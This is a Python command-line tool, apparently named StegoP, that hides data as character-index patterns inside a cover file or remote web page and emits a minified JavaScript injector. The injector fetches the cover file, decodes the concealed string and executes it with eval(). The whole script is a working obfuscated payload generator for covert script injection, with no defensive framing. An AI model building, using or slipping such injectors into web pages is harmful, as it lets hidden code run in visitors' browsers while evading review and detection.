#!/usr/bin/env python3
import codecs
import base64
import zlib
import os.path
import requests
import argparse

class StegoP:
    def __init__(self, min_char, max_char):
        self.charset = [*range(min_char, max_char+1)]
        self.original_charset = self.charset[:]

        self.base_chars = ["0", "1", "2", "3",
                           "4", "5", "6", "7",
                           "8", "9", "a", "b",
                           "c", "d", "e", "f"]

        self.map = {}

    def read(self, path):
        self.path = path
        if os.path.exists(path):
            with open(path, 'r') as f:
                self.filedata = f.read()
        elif "http" in path:
            r = requests.get(path)
            self.filedata = r.text.encode('ascii',errors='ignore').decode()
        else:
            print("Link or file not found")

    def generate_map(self):
        p = 0
        for b in self.base_chars:
            for i in range(p, len(self.filedata)):
                c = self.filedata[i]
                if ord(c) not in self.charset:
                  continue

                self.map[b] = i
                self.charset.remove(ord(c))
                break
            p = i + 1

    def encrypt(self, data):
        pass

    def encode(self, data):
        output = []
        data_hex = codecs.encode(bytes(data, 'ascii'), "hex").decode()
        for c in data_hex:
            output.append(str(self.map[c]))

        compress = zlib.compress(bytes(','.join(output), 'ascii'))
        b64_compress = base64.b64encode(compress)
        return b64_compress.decode()

    def decrypt(self, data):
        pass

    def decode(self, b64_compress):
        data_hex = ""
        compress = base64.b64decode(b64_compress)
        output = zlib.decompress(compress).decode()
        output = output.split(",")

        for c in output:
            data_hex += list(self.map.keys())[list(self.map.values()).index(int(c))]

        data = codecs.decode(data_hex, "hex").decode()
        return data


    def generate_js_injector(self, pattern):
      return 'function loadXMLDoc(t){(xmlhttp=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP")).open("GET",t,!1),xmlhttp.send()}var base_chars='+str(self.base_chars).replace(" ", "")+',charset='+str(self.original_charset).replace(" ", "")+',file="'+str(self.path)+'",b="'+pattern+'",decodedStr=atob(b),unziped=pako.ungzip(decodedStr,{to:"string"}),pattern=unziped.split(","),xmlhttp=!1;if(loadXMLDoc(file),1!=xmlhttp){var i=1,map={},filedata=xmlhttp.responseText,filedata=filedata.replace(/[^\\x00-\\x7F]/g,"");base_chars.forEach(t=>{for(;i<filedata.length;i++){var a=filedata.charAt(i).charCodeAt(0);if(!(charset.indexOf(a)<0)){map[t]=i,charset.splice(charset.indexOf(a),1);break}}i++});var data_hex="";pattern.forEach(a=>{Object.keys(map).forEach(function(t){map[t]==a&&(data_hex+=t)})});for(var data="",n=0;n<data_hex.length;n+=2)data+=String.fromCharCode(parseInt(data_hex.substr(n,2),16));eval(data)}'

parser = argparse.ArgumentParser()
parser.add_argument('--minchar', default=97, help='Lower limit for charset default 97')
parser.add_argument('--maxchar', default=123, help='Upper limit for charset defualt 123')
parser.add_argument('-g', '--generate', help='Generate js injector', action='store_true')
parser.add_argument('-e', '--encode', help='Encode Data', action='store_true')
parser.add_argument('-d', '--decode', help='Decode Data', action='store_true')
parser.add_argument('-f', '--file', dest="path", help='Path to file or link', required=True)
parser.add_argument('-i', '--input', help='Input Data', required=True)
args = parser.parse_args()

if int(args.maxchar) - int(args.minchar) < 16:
  print("Difference between maxchar and minchar must be more than 16")
  exit()

stegop = StegoP(int(args.minchar), int(args.maxchar))
stegop.read(args.path)
stegop.generate_map()


if args.encode:
  ret = stegop.encode(args.input)
  print("\nEncoded data:")
  print(ret)

if args.generate:
  if not args.encode:
    print("Cannot Generate Javascript without encoding")
    exit()
  print("\nJavascript payload:")
  print(stegop.generate_js_injector(ret))

if args.decode:
  print("\nDecoded data:")
  ret = stegop.decode(args.input)
  print(ret)

